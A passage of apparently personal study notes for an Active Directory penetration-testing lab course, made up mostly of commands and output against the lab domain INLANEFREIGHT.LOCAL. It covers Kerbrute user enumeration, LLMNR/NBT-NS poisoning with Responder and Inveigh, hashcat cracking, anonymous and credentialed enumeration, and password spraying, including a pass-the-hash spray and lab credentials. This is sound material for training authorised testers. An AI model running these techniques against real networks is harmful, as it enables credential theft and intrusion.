</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>2021/11/17 23:01:46 &gt;  Using KDC(s):
</span></span><span style=display:flex><span>2021/11/17 23:01:46 &gt;   172.16.5.5:88
</span></span><span style=display:flex><span>2021/11/17 23:01:46 &gt;  [+] VALID USERNAME:       jjones@INLANEFREIGHT.LOCAL
</span></span><span style=display:flex><span>2021/11/17 23:01:46 &gt;  [+] VALID USERNAME:       sbrown@INLANEFREIGHT.LOCAL
</span></span><span style=display:flex><span>2021/11/17 23:01:46 &gt;  [+] VALID USERNAME:       tjohnson@INLANEFREIGHT.LOCAL
</span></span><span style=display:flex><span>2021/11/17 23:01:50 &gt;  [+] VALID USERNAME:       evalentin@INLANEFREIGHT.LOCAL
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span> &lt;SNIP&gt;
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span>2021/11/17 23:01:51 &gt;  [+] VALID USERNAME:       sgage@INLANEFREIGHT.LOCAL
</span></span><span style=display:flex><span>2021/11/17 23:01:51 &gt;  [+] VALID USERNAME:       jshay@INLANEFREIGHT.LOCAL
</span></span><span style=display:flex><span>2021/11/17 23:01:51 &gt;  [+] VALID USERNAME:       jhermann@INLANEFREIGHT.LOCAL
</span></span><span style=display:flex><span>2021/11/17 23:01:51 &gt;  [+] VALID USERNAME:       whouse@INLANEFREIGHT.LOCAL
</span></span><span style=display:flex><span>2021/11/17 23:01:51 &gt;  [+] VALID USERNAME:       emercer@INLANEFREIGHT.LOCAL
</span></span><span style=display:flex><span>2021/11/17 23:01:52 &gt;  [+] VALID USERNAME:       wshepherd@INLANEFREIGHT.LOCAL
</span></span><span style=display:flex><span>2021/11/17 23:01:56 &gt;  Done! Tested 48705 usernames (56 valid) in 9.940 second
</span></span></code></pre></div><p>Â </p><p>Â </p><h1 id=llmnrnbt-ns-poisoning---from-linux>LLMNR/NBT-NS Poisoning - from Linux</h1><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>UDP 137, UDP 138, UDP 53, UDP/TCP 389,TCP 1433, UDP 1434, TCP 80, TCP 135, TCP 139, TCP 445, TCP 21, TCP 3141,TCP 25, TCP 110, TCP 587, TCP 3128, Multicast UDP 5355 and 5353
</span></span></code></pre></div><p>Â </p><h4 id=starting-responder-with-default-settings>Starting Responder with Default Settings</h4><p>Code: bash</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo responder -I ens224</span></span></code></pre></div><p>Â </p><p>Â </p><h4 id=cracking-an-ntlmv2-hash-with-hashcat>Cracking an NTLMv2 Hash With Hashcat</h4><p>LLMNR/NBT-NS Poisoning - from Linux</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt 
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>hashcat (v6.1.1) starting...
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>&lt;SNIP&gt;
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Dictionary cache hit:
</span></span><span style=display:flex><span>* Filename..: /usr/share/wordlists/rockyou.txt
</span></span><span style=display:flex><span>* Passwords.: 14344385
</span></span><span style=display:flex><span>* Bytes.....: 139921507
</span></span><span style=display:flex><span>* Keyspace..: 14344385
</span></span></code></pre></div><p>Â </p><h1 id=llmnrnbt-ns-poisoning---from-windows>LLMNR/NBT-NS Poisoning - from Windows</h1><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; Import-Module .\Inveigh.ps1</code></pre></div><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y

[*] Inveigh 1.506 started at 2022-02-28T19:26:30
[+] Elevated Privilege Mode = Enabled
[+] Primary IP Address = 172.16.5.25
[+] Spoofer IP Address = 172.16.5.25
[+] ADIDNS Spoofer = Disabled
[+] DNS Spoofer = Enabled
[+] DNS TTL = 30 Seconds</code></pre></div><p>Â </p><p>Â </p><p>C# tool</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; .\Inveigh.exe

[*] Inveigh 2.0.4 [Started 2022-02-28T20:03:28 | PID 6276]
[+] Packet Sniffer Addresses [IP 172.16.5.25 | IPv6 fe80::dcec:2831:712b:c9a3%8]
[+] Listener Addresses [IP 0.0.0.0 | IPv6 ::]
[+] Spoofer Reply Addresses [IP 172.16.5.25 | IPv6 fe80::dcec:2831:712b:c9a3%8]
[+] Spoofer Options [Repeat Enabled | Local Attacks Disabled]
[ ] DHCPv6
[+] DNS Packet Sniffer [Type A]
[ ] ICMPv6
[+] LLMNR Packet Sniffer [Type A]
[ ] MDNS
[ ] NBNS
[+] HTTP Listener [HTTPAuth NTLM | WPADAuth NTLM | Port 80]
[ ] HTTPS
[+] WebDAV [WebDAVAuth NTLM]
[ ] Proxy
[+] LDAP Listener [Port 389]</code></pre></div><p>Â </p><h2 id=enumerating-the-password-policy---from-linux---credentialed>Enumerating the Password Policy - from Linux - Credentialed</h2><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
</span></span></code></pre></div><p>Â </p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>rpcclient -U &#34;&#34; -N 172.16.5.5
</span></span></code></pre></div><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>rpcclient $&gt; querydominfo
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Domain:		INLANEFREIGHT
</span></span><span style=display:flex><span>Server:		
</span></span><span style=display:flex><span>Comment:	
</span></span><span style=display:flex><span>Total Users:	3650
</span></span><span style=display:flex><span>Total Groups:	0
</span></span><span style=display:flex><span>Total Aliases:	37
</span></span><span style=display:flex><span>Sequence No:	1
</span></span><span style=display:flex><span>Force Logoff:	-1
</span></span><span style=display:flex><span>Domain Server State:	0x1
</span></span><span style=display:flex><span>Server Role:	ROLE_DOMAIN_PDC
</span></span><span style=display:flex><span>Unknown 3:	0x1
</span></span><span style=display:flex><span>rpcclient $&gt; getdompwinfo
</span></span><span style=display:flex><span>min_password_length: 8
</span></span><span style=display:flex><span>password_properties: 0x00000001
</span></span><span style=display:flex><span>    DOMAIN_PASSWORD_COMPLEX
</span></span></code></pre></div><p>Â </p><p>Â </p><p>Â </p><h4 id=using-enum4linux>Using enum4linux</h4><p>Enumerating & Retrieving Password Policies</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ enum4linux -P 172.16.5.5
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>&lt;SNIP&gt;
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span> ================================================== 
</span></span><span style=display:flex><span>|    Password Policy Information for 172.16.5.5    |
</span></span><span style=display:flex><span> ================================================== 
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>[+] Attaching to 172.16.5.5 using a NULL share
</span></span><span style=display:flex><span>[+] Trying protocol 139/SMB...
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>    [!] Protocol failed: Cannot request session (Called Name:172.16.5.5)
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>[+] Trying protocol 445/SMB...
</span></span><span style=display:flex><span>[+] Found domain(s):
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>    [+] INLANEFREIGHT
</span></span><span style=display:flex><span>    [+] Builtin
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>[+] Password Info for Domain: INLANEFREIGHT
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>    [+] Minimum password length: 8
</span></span><span style=display:flex><span>    [+] Password history length: 24
</span></span><span style=display:flex><span>    [+] Maximum password age: Not Set
</span></span><span style=display:flex><span>    [+] Password Complexity Flags: 000001
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>        [+] Domain Refuse Password Change: 0
</span></span><span style=display:flex><span>        [+] Domain Password Store Cleartext: 0
</span></span><span style=display:flex><span>        [+] Domain Password Lockout Admins: 0
</span></span><span style=display:flex><span>        [+] Domain Password No Clear Change: 0
</span></span><span style=display:flex><span>        [+] Domain Password No Anon Change: 0
</span></span><span style=display:flex><span>        [+] Domain Password Complex: 1
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>    [+] Minimum password age: 1 day 4 minutes 
</span></span><span style=display:flex><span>    [+] Reset Account Lockout Counter: 30 minutes 
</span></span><span style=display:flex><span>    [+] Locked Account Durati
</span></span></code></pre></div><p>Â </p><p>Â </p><p>Â </p><h4 id=using-ldapsearch>Using ldapsearch</h4><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ ldapsearch -h 172.16.5.5 -x -b &#34;DC=INLANEFREIGHT,DC=LOCAL&#34; -s sub &#34;*&#34; | grep -m 1 -B 10 pwdHistoryLength
</span></span></code></pre></div><p>Â </p><h2 id=enumerating-the-password-policy---from-windows>Enumerating the Password Policy - from Windows</h2><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session> net accounts</code></pre></div><h4 id=using-powerview>Using PowerView</h4><p>Enumerating & Retrieving Password Policies</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; import-module .\PowerView.ps1
PS C:\local&gt; Get-DomainPolicy

Unicode        : @{Unicode=yes}
SystemAccess   : @{MinimumPasswordAge=1; MaximumPasswordAge=-1; MinimumPasswordLength=8; PasswordComplexity=1;
                 PasswordHistorySize=24; LockoutBadCount=5; ResetLockoutCount=30; LockoutDuration=30;
                 RequireLogonToChangePassword=0; ForceLogoffWhenHourExpire=0; ClearTextPassword=0;
                 LSAAnonymousNameLookup=0}
KerberosPolicy : @{MaxTicketAge=10; MaxRenewAge=7; MaxServiceAge=600; MaxClockSkew=5; TicketValidateClient=1}
Version        : @{signature=&#34;$CHICAGO$&#34;; Revision=1}
RegistryValues : @{MACHINE\System\CurrentControlSet\Control\Lsa\NoLMHash=System.Object[]}
Path           : \\INLANEFREIGHT.LOCAL\sysvol\INLANEFREIGHT.LOCAL\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHI
                 NE\Microsoft\Windows NT\SecEdit\GptTmpl.inf
GPOName        : {31B2F340-016D-11D2-945F-00C04FB984F9}
GPODisplayName : Default Domain Policy</code></pre></div><p>Â </p><p>Â </p><h2 id=detailed-user-enumeration>Detailed User Enumeration</h2><ul><li>By leveraging an SMB NULL session to retrieve a complete list of domain users from the domain controller</li><li>Utilizing an LDAP anonymous bind to query LDAP anonymously and pull down the domain user list</li><li>Using a tool such as <code>Kerbrute</code> to validate users utilizing a word list from a source such as the <a href=https://github.com/insidetrust/statistically-likely-usernames rel=external>statistically-likely-usernames</a> GitHub repo, or gathered by using a tool such as <a href=https://github.com/initstring/linkedin2username rel=external>linkedin2username</a> to create a list of potentially valid users</li><li>Using a set of credentials from a Linux or Windows attack system either provided by our client or obtained through another means such as LLMNR/NBT-NS response poisoning using <code>Responder</code> or even a successful password spray using a smaller wordlist</li></ul><p>Â </p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ enum4linux -U 172.16.5.5  | grep &#34;user:&#34; | cut -f2 -d&#34;[&#34; | cut -f1 -d&#34;]&#34;
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>administrator
</span></span><span style=display:flex><span>guest
</span></span><span style=display:flex><span>krbtgt
</span></span><span style=display:flex><span>lab_adm
</span></span><span style=display:flex><span>local-student
</span></span><span style=display:flex><span>avazquez
</span></span><span style=display:flex><span>pfalcon
</span></span><span style=display:flex><span>fanthony
</span></span><span style=display:flex><span>wdillard
</span></span><span style=display:flex><span>lbradford
</span></span><span style=display:flex><span>sgage
</span></span><span style=display:flex><span>asanchez
</span></span><span style=display:flex><span>dbranch
</span></span><span style=display:flex><span>ccruz
</span></span><span style=display:flex><span>njohnson
</span></span><span style=display:flex><span>mholliday
</span></span></code></pre></div><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ rpcclient -U &#34;&#34; -N 172.16.5.5
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>rpcclient $&gt; enumdomusers 
</span></span><span style=display:flex><span>user:[administrator] rid:[0x1f4]
</span></span><span style=display:flex><span>user:[guest] rid:[0x1f5]
</span></span><span style=display:flex><span>user:[krbtgt] rid:[0x1f6]
</span></span><span style=display:flex><span>user:[lab_adm] rid:[0x3e9]
</span></span><span style=display:flex><span>user:[local-student] rid:[0x457]
</span></span><span style=display:flex><span>user:[avazquez] rid:[0x458]
</span></span></code></pre></div><p>Â </p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ crackmapexec smb 172.16.5.5 --users
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
</span></span><span style=display:flex><span>SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain user(s)
</span></span><span style=display:flex><span>SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\administrator                  badpwdcount: 0 baddpwdtime: 2022-01-10 13:23:09.463228
</span></span><span style=display:flex><span>SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\guest                          badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58
</span></span><span style=display:flex><span>SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\lab_adm                        badpwdcount: 0 baddpwdtime: 2021-12-21 14:10:56.859064
</span></span><span style=display:flex><span>SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\krbtgt                         badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58
</span></span><span style=display:flex><span>SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\local-student                    badpwdcount: 0 baddpwdtime: 2022-02-22 14:48:26.653366
</span></span><span style=display:flex><span>SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\avazquez                       badpwdcount: 0 baddpwdtime: 2022-02-17 22:59:22.684613
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>&lt;SNIP&gt;
</span></span></code></pre></div><p>Â </p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ ldapsearch -H ldap://10.10.10.172 -x -b &#34;DC=MEGABANK,DC=LOCAL&#34; -s sub &#34;(&amp;(objectclass=user))&#34; | grep sAMAccountName | awk &#39;{print $2}&#39; &gt; usernames.txt
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>guest
</span></span><span style=display:flex><span>ACADEMY-EA-DC01$
</span></span><span style=display:flex><span>ACADEMY-EA-MS01$
</span></span><span style=display:flex><span>ACADEMY-EA-WEB01$
</span></span><span style=display:flex><span>local-student
</span></span><span style=display:flex><span>avazquez
</span></span><span style=display:flex><span>pfalcon
</span></span><span style=display:flex><span>fanthony
</span></span><span style=display:flex><span>wdillard
</span></span><span style=display:flex><span>lbradford
</span></span><span style=display:flex><span>sgage
</span></span><span style=display:flex><span>asanchez
</span></span><span style=display:flex><span>dbranch
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>ldapsearch -H ldap://172.16.5.5 -x -D &#34;local-student@INLANEFREIGHT.LOCAL&#34; -W -b &#34;DC=INLANEFREIGHT,DC=LOCAL&#34; -s sub &#34;(&amp;(objectclass=user)(!(objectClass=computer)))&#34; sAMAccountName | grep sAMAccountName: | cut -f2 -d&#39; &#39; | sort -u
</span></span></code></pre></div><p>Â </p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ ./windapsearch.py --dc-ip 172.16.5.5 -u &#34;&#34; -U
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>[+] No username provided. Will try anonymous bind.
</span></span><span style=display:flex><span>[+] Using Domain Controller at: 172.16.5.5
</span></span><span style=display:flex><span>[+] Getting defaultNamingContext from Root DSE
</span></span><span style=display:flex><span>[+]	Found: DC=INLANEFREIGHT,DC=LOCAL
</span></span><span style=display:flex><span>[+] Attempting bind
</span></span><span style=display:flex><span>[+]	...success! Binded as: 
</span></span><span style=display:flex><span>[+]	 None
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>[+] Enumerating all AD users
</span></span><span style=display:flex><span>[+]	Found 2906 users: 
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>cn: Guest
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>cn: local Student
</span></span><span style=display:flex><span>userPrincipalName: local-student@inlanefreight.local
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>cn: Annie Vazquez
</span></span><span style=display:flex><span>userPrincipalName: avazquez@inlanefreight.local
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>cn: Paul Falcon
</span></span><span style=display:flex><span>userPrincipalName: pfalcon@inlanefreight.local
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>cn: Fae Anthony
</span></span><span style=display:flex><span>userPrincipalName: fanthony@inlanefreight.local
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>cn: Walter Dillard
</span></span><span style=display:flex><span>userPrincipalName: wdillard@inlanefreight.local
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>&lt;SNIP&gt;
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>cube111@local[/local]$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
</span></span></code></pre></div><p>Â </p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$  kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>    __             __               __     
</span></span><span style=display:flex><span>   / /_____  _____/ /_  _______  __/ /____ 
</span></span><span style=display:flex><span>  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
</span></span><span style=display:flex><span> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
</span></span><span style=display:flex><span>/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Version: dev (9cfb81e) - 02/17/22 - Ronnie Flathers @ropnop
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>2022/02/17 22:16:11 &gt;  Using KDC(s):
</span></span><span style=display:flex><span>2022/02/17 22:16:11 &gt;  	172.16.5.5:88
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>2022/02/17 22:16:11 &gt;  [+] VALID USERNAME:	 jjones@inlanefreight.local
</span></span><span style=display:flex><span>2022/02/17 22:16:11 &gt;  [+] VALID USERNAME:	 sbrown@inlanefreight.local
</span></span><span style=display:flex><span>2022/02/17 22:16:11 &gt;  [+] VALID USERNAME:	 tj
</span></span></code></pre></div><p>Â </p><p>Â </p><p>Â </p><h1 id=internal-password-spraying---from-linux>Internal Password Spraying - from Linux</h1><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>for u in $(cat valid_users.txt);do rpcclient -U &#34;$u%Welcome1&#34; -c &#34;getusername;quit&#34; 172.16.5.5 | grep Authority; done
</span></span></code></pre></div><p>Â </p><h4 id=using-kerbrute-for-the-attack>Using Kerbrute for the Attack</h4><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>[!bash!]$ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>    __             __               __     
</span></span><span style=display:flex><span>   / /_____  _____/ /_  _______  __/ /____ 
</span></span><span style=display:flex><span>  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
</span></span><span style=display:flex><span> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
</span></span><span style=display:flex><span>/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Version: dev (9cfb81e) - 02/17/22 - Ronnie Flathers @ropnop
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>2022/02/17 22:57:12 &gt;  Using KDC(s):
</span></span><span style=display:flex><span>2022/02/17 22:57:12 &gt;  	172.16.5.5:88
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>2022/02/17 22:57:12 &gt;  [+] VALID LOGIN:	 sgage@inlanefreight.local:Welcome1
</span></span><span style=display:flex><span>2022/02/17 22:57:12 &gt;  Done! Tested 57 logins (1 successes) in 0.172 seconds
</span></span></code></pre></div><p>Â </p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>[!bash!]$ sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123
</span></span></code></pre></div><p>Â </p><p>Â </p><h4 id=local-admin-spraying-with-crackmapexec>Local Admin Spraying with CrackMapExec</h4><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>[!bash!]$ sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
</span></span></code></pre></div><p>Â </p><p>Â </p><p>Â </p><p>Â </p><p>Â </p><h4 id=using-domainpasswordsprayps1>Using DomainPasswordSpray.ps1</h4><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; Import-Module .\DomainPasswordSpray.ps1
PS C:\local&gt; Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue

[*] Current domain is compatible with Fine-Grained Password Policy.
[*] Now creating a list of users to spray...
[*] The smallest lockout threshold discovered in the domain is 5 login attempts.
[*] Removing disabled users from list.
[*] There are 2923 total users found.
[*] Removing users within 1 attempt of locking out from list.
[*] Created a userlist containing 2923 users gathered from the current user&#39;s domain
[*] The domain password policy observation window is set to  minutes.
[*] Setting a  minute wait in between sprays.

Confirm Password Spray
Are you sure you want to perform a password spray against 2923 accounts?
[Y] Yes  [N] No  [?] Help (default is &#34;Y&#34;): Y

[*] Password spraying has begun with  1  passwords
[*] This might take a while depending on the total number of users
[*] Now trying password Welcome1 against 2923 users. Current time is 2:57 PM
[*] Writing successes to spray_success
[*] SUCCESS! User:sgage Password:Welcome1
[*] SUCCESS! User:tjohnson Password:Welcome1

[*] Password spraying is complete
[*] Any passwords that were successfully sprayed have been output to spray_success</code></pre></div><p>Â </p><p>Â </p><p>Â </p><p>Â </p><h1 id=enumerating-security-controls>Enumerating Security Controls</h1><p>Â </p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; Get-MpComputerStatus

AMEngineVersion                 : 1.1.17400.5
AMProductVersion                : 4.10.14393.0
